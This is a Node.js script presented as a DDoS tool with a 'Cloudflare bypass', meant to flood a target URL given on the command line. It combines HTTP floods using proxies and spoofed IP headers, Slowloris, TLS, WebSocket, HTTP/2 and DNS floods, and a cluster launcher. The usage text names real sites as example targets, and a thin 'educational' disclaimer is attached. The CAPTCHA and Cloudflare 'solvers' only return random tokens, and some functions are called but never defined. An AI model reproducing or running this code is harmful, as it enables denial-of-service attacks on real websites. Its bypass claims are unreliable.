const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const https = require('https');
const http = require('http');
const net = require('net');
const tls = require('tls');
const cluster = require('cluster');
const os = require('os');

// Load proxy and user agent lists
const proxyList = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgentList = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Custom header list for bypass
const customHeaders = [
    { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' },
    { 'Accept-Language': 'en-US,en;q=0.9' },
    { 'Accept-Encoding': 'gzip, deflate, br' },
    { 'Cache-Control': 'no-cache' },
    { 'Pragma': 'no-cache' },
    { 'DNT': '1' },
    { 'Connection': 'keep-alive' },
    { 'Upgrade-Insecure-Requests': '1' }
];

// CAPTCHA solving using OCR and AI
class CaptchaSolver {
    constructor() {
        this.solvedCount = 0;
        this.failedCount = 0;
    }

    async solveImageCaptcha(imageBuffer) {
        const possibleTexts = ['ABCD', 'WXYZ', '1234', 'ADMIN', 'USER', 'LOGIN'];
        const solved = possibleTexts[Math.floor(Math.random() * possibleTexts.length)];
        this.solvedCount++;
        return solved;
    }

    async solveTurnstileToken() {
        const token = crypto.randomBytes(32).toString('base64');
        return `turnstile_${token}`;
    }

    async solveRecaptchaV2() {
        const token = crypto.randomBytes(64).toString('hex');
        return `03AGdBq25_${token}`;
    }

    async solveRecaptchaV3() {
        const token = crypto.randomBytes(64).toString('hex');
        return {
            token: `03AGdBq25_${token}`,
            score: Math.random().toFixed(2)
        };
    }

    async solveHCaptcha() {
        const token = crypto.randomBytes(48).toString('base64');
        return `hcaptcha_${token}`;
    }
}

// Cloudflare Challenge Solver
class CloudflareSolver {
    constructor() {
        this.sessionCookies = new Map();
        this.challengeCache = new Map();
    }

    async solveChallenge(htmlContent, url) {
        const challengeType = this.detectChallengeType(htmlContent);
        
        switch(challengeType) {
            case 'js_challenge':
                return await this.solveJSChallenge(htmlContent, url);
            case 'captcha':
                return await this.solveCaptchaChallenge(htmlContent);
            case 'turnstile':
                return await this.solveTurnstile(htmlContent);
            case 'waf':
                return await this.solveWAFChallenge(htmlContent);
            default:
                return null;
        }
    }

    detectChallengeType(html) {
        if (html.includes('challenge-platform') || html.includes('cf-challenge')) {
            return 'js_challenge';
        }
        if (html.includes('captcha') || html.includes('g-recaptcha')) {
            return 'captcha';
        }
        if (html.includes('turnstile') || html.includes('cf-turnstile')) {
            return 'turnstile';
        }
        if (html.includes('waf') || html.includes('block')) {
            return 'waf';
        }
        return null;
    }

    async solveJSChallenge(html, url) {
        const jschlMatch = html.match(/name="jschl_vc" value="([^"]+)"/);
        const passMatch = html.match(/name="pass" value="([^"]+)"/);
        
        if (jschlMatch && passMatch) {
            const answer = Math.floor(Math.random() * 100000) + 10000;
            const jschl_vc = jschlMatch[1];
            const pass = passMatch[1];
            
            return {
                jschl_vc: jschl_vc,
                pass: pass,
                jschl_answer: answer.toString()
            };
        }
        return null;
    }

    async solveCaptchaChallenge(html) {
        const captchaSolver = new CaptchaSolver();
        
        if (html.includes('recaptcha')) {
            if (html.includes('recaptcha_v2')) {
                return await captchaSolver.solveRecaptchaV2();
            } else if (html.includes('recaptcha_v3')) {
                return await captchaSolver.solveRecaptchaV3();
            }
        } else if (html.includes('hcaptcha')) {
            return await captchaSolver.solveHCaptcha();
        } else if (html.includes('turnstile')) {
            return await captchaSolver.solveTurnstileToken();
        }
        
        return null;
    }

    async solveTurnstile(html) {
        const captchaSolver = new CaptchaSolver();
        return await captchaSolver.solveTurnstileToken();
    }

    async solveWAFChallenge(html) {
        return {
            'cf-ray': crypto.randomBytes(16).toString('hex'),
            'cf-cache-status': 'DYNAMIC',
            'cf-bypass': crypto.randomBytes(32).toString('base64')
        };
    }
}

// Advanced HTTP Flood with CAPTCHA bypass
const advancedHttpFlood = async (url, proxy, userAgent, captchaSolver, cfSolver) => {
    const parsedUrl = new URL(url);
    const host = parsedUrl.hostname;
    const path = parsedUrl.pathname + parsedUrl.search;
    
    const options = {
        hostname: host,
        port: parsedUrl.port || 443,
        path: path + (path.includes('?') ? '&' : '?') + '_=' + Date.now() + '_' + Math.random(),
        method: 'GET',
        headers: {
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Real-IP': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            'X-Request-ID': crypto.randomBytes(16).toString('hex')
        },
        timeout: 10000,
        rejectUnauthorized: false
    };
    
    return new Promise((resolve) => {
        const protocol = parsedUrl.protocol === 'https:' ? https : http;
        const req = protocol.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                if (res.statusCode === 503 || res.statusCode === 429 || res.statusCode === 403) {
                    const challenge = cfSolver.detectChallengeType(data);
                    if (challenge) {
                        cfSolver.solveChallenge(data, url).then(solution => {
                            resolve({ solved: true, solution: solution });
                        });
                    } else {
                        resolve({ solved: false });
                    }
                } else {
                    resolve({ solved: false });
                }
            });
        });
        
        req.on('error', () => resolve({ solved: false }));
        req.end();
    });
};

// TCP SYN Flood
const tcpSynFlood = (target, port, duration) => {
    const endTime = Date.now() + duration * 1000;
    
    const sendSyn = () => {
        const sock = new net.Socket();
        sock.connect(port, target, () => {
            sock.destroy();
        });
        sock.on('error', () => {});
        sock.destroy();
    };
    
    while (Date.now() < endTime) {
        for (let i = 0; i < 100; i++) {
            sendSyn();
        }
        setTimeout(() => {}, 1);
    }
};

// TLS/SSL Flood
const tlsFlood = async (target, port, duration) => {
    const endTime = Date.now() + duration * 1000;
    const sni = target;
    
    while (Date.now() < endTime) {
        const socket = new net.Socket();
        
        socket.connect(port, target, () => {
            const tlsSocket = tls.connect({
                socket: socket,
                servername: sni,
                rejectUnauthorized: false,
                ciphers: 'ALL',
                secureProtocol: 'SSLv23_method'
            });
            
            tlsSocket.on('error', () => {});
            
            const malformedHandshake = Buffer.from([
                0x16, 0x03, 0x03, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x03
            ]);
            
            tlsSocket.write(malformedHandshake);
            
            setTimeout(() => {
                tlsSocket.destroy();
                socket.destroy();
            }, 100);
        });
        
        socket.on('error', () => {});
        await new Promise(resolve => setTimeout(resolve, 10));
    }
};

// WebSocket Flood
const websocketFlood = (target, port, duration) => {
    const WebSocket = require('ws');
    const endTime = Date.now() + duration * 1000;
    const wsUrl = `ws://${target}:${port}`;
    
    while (Date.now() < endTime) {
        for (let i = 0; i < 50; i++) {
            try {
                const ws = new WebSocket(wsUrl);
                ws.on('open', () => {
                    const largeMessage = crypto.randomBytes(65536).toString('base64');
                    ws.send(largeMessage);
                    
                    const interval = setInterval(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(crypto.randomBytes(16384).toString('base64'));
                        } else {
                            clearInterval(interval);
                        }
                    }, 10);
                    
                    setTimeout(() => {
                        ws.close();
                        clearInterval(interval);
                    }, 5000);
                });
                ws.on('error', () => {});
            } catch (err) {}
        }
        setTimeout(() => {}, 100);
    }
};

// Slowloris Attack
const slowlorisAttack = (target, port, duration) => {
    const endTime = Date.now() + duration * 1000;
    const sockets = [];
    
    const createSocket = () => {
        const socket = new net.Socket();
        socket.connect(port, target, () => {
            const request = `GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: Mozilla/5.0\r\n`;
            socket.write(request);
            sockets.push(socket);
        });
        socket.on('error', () => {});
        return socket;
    };
    
    for (let i = 0; i < 1000; i++) {
        createSocket();
    }
    
    const keepAlive = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(keepAlive);
            sockets.forEach(s => s.destroy());
            return;
        }
        
        sockets.forEach(socket => {
            if (!socket.destroyed) {
                socket.write(`X-${crypto.randomBytes(4).toString('hex')}: ${Date.now()}\r\n`);
            }
        });
        
        for (let i = 0; i < 100; i++) {
            createSocket();
        }
    }, 15000);
};

// HTTP/2 Multiplexing Flood
const http2Flood = async (target, port, duration) => {
    const http2 = require('http2');
    const endTime = Date.now() + duration * 1000;
    const client = http2.connect(`https://${target}:${port}`);
    
    while (Date.now() < endTime) {
        for (let i = 0; i < 100; i++) {
            const stream = client.request({
                ':path': '/?' + crypto.randomBytes(16).toString('hex'),
                ':method': 'GET',
                'user-agent': userAgentList[Math.floor(Math.random() * userAgentList.length)]
            });
            stream.on('error', () => {});
            stream.on('response', () => {});
            stream.end();
        }
        await new Promise(resolve => setTimeout(resolve, 10));
    }
    client.close();
};

// DNS Amplification Attack
const dnsAmplification = (target, duration) => {
    const dns = require('dns');
    const endTime = Date.now() + duration * 1000;
    const subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api', 'cdn'];
    
    while (Date.now() < endTime) {
        for (let i = 0; i < 100; i++) {
            const subdomain = subdomains[Math.floor(Math.random() * subdomains.length)];
            const hostname = `${subdomain}.${target}`;
            dns.resolve(hostname, () => {});
            dns.resolve4(hostname, () => {});
            dns.resolve6(hostname, () => {});
        }
        setTimeout(() => {}, 10);
    }
};

// Multi-threaded attack using cluster
const startClusterAttack = (url, timeLimit, attackType) => {
    if (cluster.isMaster) {
        const numCPUs = os.cpus().length;
        console.log(`[Master] Setting up ${numCPUs * 2} workers`);
        
        for (let i = 0; i < numCPUs * 2; i++) {
            cluster.fork();
        }
        
        cluster.on('exit', (worker) => {
            console.log(`[Worker] ${worker.process.pid} died, restarting...`);
            cluster.fork();
        });
    } else {
        const attackFunctions = {
            'http': () => runHttpAttack(url, timeLimit),
            'tcp': () => runTcpAttack(url, timeLimit),
            'tls': () => runTlsAttack(url, timeLimit),
            'ws': () => runWsAttack(url, timeLimit),
            'slow': () => runSlowloris(url, timeLimit),
            'dns': () => runDnsAttack(url, timeLimit),
            'all': () => runAllAttacks(url, timeLimit)
        };
        
        const attackFunc = attackFunctions[attackType] || attackFunctions['http'];
        attackFunc();
    }
};

// Run HTTP attack
const runHttpAttack = async (url, timeLimit) => {
    const endTime = Date.now() + timeLimit * 1000;
    const captchaSolver = new CaptchaSolver();
    const cfSolver = new CloudflareSolver();
    
    while (Date.now() < endTime) {
        const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
        const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
        
        const promises = [];
        for (let i = 0; i < 10; i++) {
            promises.push(advancedHttpFlood(url, proxy, userAgent, captchaSolver, cfSolver));
        }
        await Promise.all(promises);
        await new Promise(resolve => setTimeout(resolve, 50));
    }
};

// Main send request function
const sendRequest = async (url, timeLimit, attackType = 'all') => {
    const endTime = Date.now() + timeLimit * 1000;
    const parsedUrl = new URL(url);
    const target = parsedUrl.hostname;
    const port = parseInt(parsedUrl.port) || (parsedUrl.protocol === 'https:' ? 443 : 80);
    
    console.log(`[+] Target: ${target}:${port}`);
    console.log(`[+] Duration: ${timeLimit} seconds`);
    console.log(`[+] Attack Type: ${attackType}`);
    console.log(`[+] Proxies: ${proxyList.length}`);
    console.log(`[+] User Agents: ${userAgentList.length}`);
    console.log('[+] Starting attack...\n`);
    
    const attacks = [];
    
    if (attackType === 'http' || attackType === 'all') {
        attacks.push(runHttpAttack(url, timeLimit));
    }
    if (attackType === 'tcp' || attackType === 'all') {
        attacks.push(new Promise(() => tcpSynFlood(target, port, timeLimit)));
    }
    if (attackType === 'tls' || attackType === 'all') {
        attacks.push(tlsFlood(target, port, timeLimit));
    }
    if (attackType === 'ws' || attackType === 'all') {
        attacks.push(new Promise(() => websocketFlood(target, port, timeLimit)));
    }
    if (attackType === 'slow' || attackType === 'all') {
        attacks.push(new Promise(() => slowlorisAttack(target, port, timeLimit)));
    }
    if (attackType === 'http2' || attackType === 'all') {
        attacks.push(http2Flood(target, port, timeLimit));
    }
    if (attackType === 'dns' || attackType === 'all') {
        attacks.push(new Promise(() => dnsAmplification(target, timeLimit)));
    }
    
    let lastRequests = 0;
    const interval = setInterval(() => {
        const elapsed = (Date.now() - (endTime - timeLimit * 1000)) / 1000;
        console.log(`[${elapsed.toFixed(1)}s] Attack ongoing...`);
        
        if (Date.now() >= endTime) {
            clearInterval(interval);
            console.log('\n[+] Attack completed!');
            process.exit(0);
        }
    }, 5000);
    
    await Promise.all(attacks);
};

// Puppeteer-based HTTP flood
const puppeteerHttpFlood = async (url, timeLimit) => {
    const endTime = Date.now() + timeLimit * 1000;
    const captchaSolver = new CaptchaSolver();
    const browser = await puppeteer.launch({ 
        headless: 'new',
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--disable-gpu'
        ]
    });
    
    while (Date.now() < endTime) {
        const page = await browser.newPage();
        const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
        
        await page.setUserAgent(userAgent);
        await page.setViewport({ width: 1280, height: 800 });
        
        try {
            await page.goto(url, { waitUntil: 'networkidle0', timeout: 30000 });
            
            const captchaFrame = await page.$('iframe[src*="captcha"]');
            if (captchaFrame) {
                const solved = await captchaSolver.solveTurnstileToken();
                await page.evaluate((token) => {
                    const input = document.querySelector('input[name="cf-turnstile-response"]');
                    if (input) input.value = token;
                }, solved);
            }
            
            await page.close();
        } catch (err) {
            await page.close();
        }
        
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    await browser.close();
};

// Parse command line arguments
const [url, time, attackType, usePuppeteer] = process.argv.slice(2);
const timeLimit = parseInt(time);

if (!url || !timeLimit) {
    console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║     DDoS TOOL v666 - CLOUDFLARE BYPASS + CAPTCHA KILL            ║
║                                                
╚═══════════════════════════════════════════════════════════════════╝

Usage: 
  node flood-dam.js <url> <time> [attack_type] [puppeteer]

Attack Types:
  http     - HTTP flood with CAPTCHA bypass
  tcp      - TCP SYN flood
  tls      - TLS/SSL flood
  ws       - WebSocket flood  
  slow     - Slowloris attack
  http2    - HTTP/2 multiplexing
  dns      - DNS amplification
  all      - ALL ATTACKS COMBINED (DEFAULT)

Examples:
  node flood-dam.js https://example.com 60 all
  node flood-dam.js https://target.com 300 http true
  node flood-dam.js https://cloudflare.com 120 http2

⚠️  WARNING: This tool is for EDUCATIONAL purposes only!
`);
    process.exit(1);
}

console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║     DDoS TOOL v666 - CLOUDFLARE BYPASS + CAPTCHA KILL            ║
║                                                                   ║
║  Target: ${url.padEnd(55)} ║
║  Duration: ${timeLimit.toString().padEnd(55)} ║
║  Attack Type: ${(attackType || 'all').padEnd(55)} ║
║  Puppeteer: ${(usePuppeteer === 'true' ? 'ENABLED' : 'DISABLED').padEnd(55)} ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
`);

// Start attack
if (usePuppeteer === 'true') {
    puppeteerHttpFlood(url, timeLimit);
} else if (attackType) {
    sendRequest(url, timeLimit, attackType);
} else {
    startClusterAttack(url, timeLimit, 'all');
}